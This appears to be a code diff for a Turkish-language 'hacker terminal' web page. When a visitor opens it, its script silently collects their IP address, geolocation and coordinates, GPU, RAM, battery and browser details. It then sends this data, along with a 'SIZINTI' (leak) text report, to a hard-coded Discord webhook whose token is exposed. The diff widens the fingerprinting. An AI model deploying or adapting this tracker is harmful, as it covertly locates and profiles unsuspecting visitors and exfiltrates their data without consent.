@@ -17,7 +17,6 @@
         .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
         #result-box { margin-top: 20px; display: none; border-top: 1px solid #333; padding-top: 15px; font-size: 13px; }
         .map-frame { width: 100%; height: 200px; margin-top: 15px; border: 1px solid #444; filter: grayscale(1) invert(1) contrast(1.2); }
-        .vpn-alert { color: #ffcc00; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffcc00; padding: 8px; text-align: center; }
         .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .label { color: #888; }
         .value { color: #ff0000; font-weight: bold; }
@@ -35,144 +34,127 @@
     </div>
 
     <div id="result-box">
-        <div id="vpn-msg"></div>
         <div class="data-grid">
             <div><span class="label">> IP:</span> <span class="value" id="user-ip">...</span></div>
-            <div><span class="label">> LOKASYON:</span> <span class="value" id="user-loc">...</span></div>
-            <div><span class="label">> ISS:</span> <span class="value" id="user-isp">...</span></div>
+            <div><span class="label">> GPU:</span> <span class="value" id="user-gpu">Analiz ediliyor...</span></div>
             <div><span class="label">> SİSTEM:</span> <span class="value" id="user-sys">...</span></div>
-            <div><span class="label">> EKRAN:</span> <span class="value" id="user-res">...</span></div>
-            <div><span class="label">> TARAYICI:</span> <span class="value" id="user-browser">...</span></div>
-            <div><span class="label">> DİL:</span> <span class="value" id="user-lang">...</span></div>
             <div><span class="label">> ŞARJ:</span> <span class="value" id="user-bat">...</span></div>
         </div>
         <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
-        <div style="margin-top: 15px; font-size: 10px; color: #444; text-align: center;">Kayıt No: #<span id="reg-no"></span> | VERİLER SİSTEME İŞLENDİ.</div>
+        <div style="margin-top: 15px; font-size: 10px; color: #444; text-align: center;">Kayıt No: #<span id="reg-no"></span> | VERİLER .TXT OLARAK ARŞİVLENDİ.</div>
     </div>
 </div>
 
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
 
-    async function fullCapture() {
-        // 1. Derin Cihaz Verilerini Topla
-        const screenRes = `${window.screen.width}x${window.screen.height}`;
-        const language = navigator.language;
-        const platform = navigator.platform;
-        const browser = navigator.userAgent.split(' ').pop();
-        const cores = navigator.hardwareConcurrency || "Bilinmiyor";
+    // ⚡️ Ekran Kartı (GPU) Bilgisini Çekme
+    function getGPUInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return "Bilinmiyor";
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+    }
+
+    async function deepCapture() {
+        // Cihaz Detayları
+        const gpu = getGPUInfo();
         const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
-        let batteryInfo = "Bilinmiyor";
+        const cores = navigator.hardwareConcurrency || "Bilinmiyor";
+        const touch = navigator.maxTouchPoints > 0 ? "Var" : "Yok";
+        const pdf = navigator.pdfViewerEnabled ? "Destekliyor" : "Desteklemiyor";
+        let batLevel = "Bilinmiyor", batTime = "Bilinmiyor";
 
         try {
             const battery = await navigator.getBattery();
-            batteryInfo = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Deşarj)'}`;
+            batLevel = `%${Math.round(battery.level * 100)}`;
+            batTime = battery.dischargingTime === Infinity ? "Prizde" : `${Math.round(battery.dischargingTime / 60)} dk`;
         } catch(e) {}
 
-        // 2. IP Detaylarını Çek
         fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(async (data) => {
-            const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-            const timeNow = new Date().toLocaleString('tr-TR');
-
-            // 3. .txt Dosyası İçeriğini Oluştur
-            const logContent = `
-========================================
-    QEAT TERMINAL VERI RAPORU
-========================================
-ZAMAN: ${timeNow}
+            const time = new Date().toLocaleString('tr-TR');
+            
+            // --- .txt RAPOR İÇERİĞİ ---
+            const report = `
+[QEAT RAPORU]
+Zaman: ${time}
 ----------------------------------------
-[IP DETAYLARI]
-IP ADRESI: ${data.ip}
-ISS (SAGLAYICI): ${data.org}
-KONUM: ${data.city} / ${data.region} / ${data.country_name}
-POSTA KODU: ${data.postal}
-KOORDINAT: ${data.latitude}, ${data.longitude}
-GOOGLE MAPS: ${mapLink}
-PARA BIRIMI: ${data.currency_name}
-SAAT DILIMI: ${data.timezone}
+[IP & KONUM]
+IP: ${data.ip}
+ISS: ${data.org}
+Konum: ${data.city} / ${data.region} / ${data.country_name}
+Posta Kodu: ${data.postal}
+Para Birimi: ${data.currency_name} (${data.currency})
+Koordinat: ${data.latitude}, ${data.longitude}
 
-[DONANIM & SISTEM]
-ISLETIM SISTEMI: ${platform}
-EKRAN COZUNURLUK: ${screenRes}
-ISLEMCI CEKIRDEK: ${cores}
-YAKLASIK RAM: ${ram}
-TARAYICI: ${navigator.userAgent}
-VARSAYILAN DIL: ${language}
-SARJ DURUMU: ${batteryInfo}
+[DONANIM & GRAFIK]
+Ekran Kartı (GPU): ${gpu}
+İşlemci Çekirdek: ${cores}
+Yaklaşık RAM: ${ram}
+Ekran Çözünürlüğü: ${window.screen.width}x${window.screen.height}
+Dokunmatik Ekran: ${touch}
+
+[SISTEM & DURUM]
+İşletim Sistemi: ${navigator.platform}
+Tarayıcı: ${navigator.userAgent}
+Şarj Seviyesi: ${batLevel}
+Kalan Süre: ${batTime}
+PDF Desteği: ${pdf}
 ----------------------------------------
-DURUM: VERILER BASARIYLA SIZDIRILDI.
-========================================`;
+DURUM: TÜM VERİLER BAŞARIYLA ÇEKİLDİ.
+`;
 
-            // 4. Discord'a Hem Embed Hem Dosya Gönder (FormData)
+            // --- DISCORD GÖNDERİMİ ---
             const formData = new FormData();
             const payload = {
-                username: "TEŞKİLAT ARŞİV BİRİMİ",
+                username: "Siber İstihbarat Ajanı",
                 embeds: [{
-                    title: data.country_code !== 'TR' ? "🕵️ VPN TESPİT EDİLDİ" : "🎯 HEDEF TERMINALDE",
-                    color: data.country_code !== 'TR' ? 16763904 : 16711680,
-                    description: `📂 **Yeni bir veri paketi arşivlendi.**\n📍 [Haritada Gör](${mapLink})`,
-                    fields: [
-                        { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
-                        { name: "📍 Konum", value: `\`${data.city} / ${data.country_name}\``, inline: true },
-                        { name: "🔋 Şarj", value: `\`${batteryInfo}\``, inline: true }
-                    ],
+                    title: "Yeni Bilgiler HGldi",
+                    color: 0xff0000,
+                    description: `🎯 **Hedef:** \`${data.ip}\`\n🎮 **GPU:** \`${gpu}\`\n📂 Detaylı rapor aşağıda eklendi.`,
                     timestamp: new Date()
                 }]
             };
 
             formData.append('payload_json', JSON.stringify(payload));
-            const blob = new Blob([logContent], { type: 'text/plain' });
-            formData.append('file', blob, `terminal_rapor_${data.ip}.txt`);
+            const blob = new Blob([report], { type: 'text/plain' });
+            formData.append('file', blob, `SIZINTI_${data.ip}.txt`);
 
             await fetch(webhookURL, { method: 'POST', body: formData });
 
-            // Ekranda gösterim için verileri sakla
-            window.cachedData = {...data, screenRes, language, platform, batteryInfo, browser, mapLink};
-            window.cachedRegNo = Math.floor(Math.random() * 89999) + 10000;
+            // Ekran Güncelleme
+            window.cachedData = {...data, gpu, batLevel, platform: navigator.platform};
+            window.cachedRegNo = Math.floor(Math.random() * 99999);
         });
     }
 
-    fullCapture();
+    deepCapture();
 
-    // Görsel bar animasyonu
+    // Bar Animasyonu
     setTimeout(() => {
         const loader = document.getElementById('loader');
         const bar = document.getElementById('bar');
         loader.style.display = 'block';
         let width = 0;
-        let interval = setInterval(() => {
+        let int = setInterval(() => {
             if (width >= 100) {
-                clearInterval(interval);
-                finalizeDisplay();
+                clearInterval(int);
+                document.getElementById('user-ip').innerText = window.cachedData.ip;
+                document.getElementById('user-gpu').innerText = window.cachedData.gpu.substring(0, 20) + "...";
+                document.getElementById('user-sys').innerText = window.cachedData.platform;
+                document.getElementById('user-bat').innerText = window.cachedData.batLevel;
+                document.getElementById('reg-no').innerText = window.cachedRegNo;
+                document.getElementById('gmap').src = `https://maps.google.com/maps?q=${window.cachedData.latitude},${window.cachedData.longitude}&z=14&output=embed`;
+                document.getElementById('result-box').style.display = 'block';
             } else {
                 width += 5;
                 bar.style.width = width + '%';
             }
         }, 50);
-    }, 2200);
-
-    function finalizeDisplay() {
-        const data = window.cachedData;
-        if (!data) { setTimeout(finalizeDisplay, 500); return; }
-
-        document.getElementById('user-ip').innerText = data.ip;
-        document.getElementById('user-loc').innerText = `${data.city} / ${data.country_name}`;
-        document.getElementById('user-isp').innerText = data.org;
-        document.getElementById('user-sys').innerText = data.platform;
-        document.getElementById('user-res').innerText = data.screenRes;
-        document.getElementById('user-browser').innerText = data.browser;
-        document.getElementById('user-lang').innerText = data.language;
-        document.getElementById('user-bat').innerText = data.batteryInfo;
-        document.getElementById('reg-no').innerText = window.cachedRegNo;
-        
-        if(data.country_code !== 'TR') {
-            document.getElementById('vpn-msg').innerHTML = `<div class="vpn-alert">SİSTEM: VPN TESPİT EDİLDİ!</div>`;
-        }
-        document.getElementById('gmap').src = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=14&output=embed`;
-        document.getElementById('result-box').style.display = 'block';
-    }
+    }, 2000);
 </script>
 </body>
 </html>
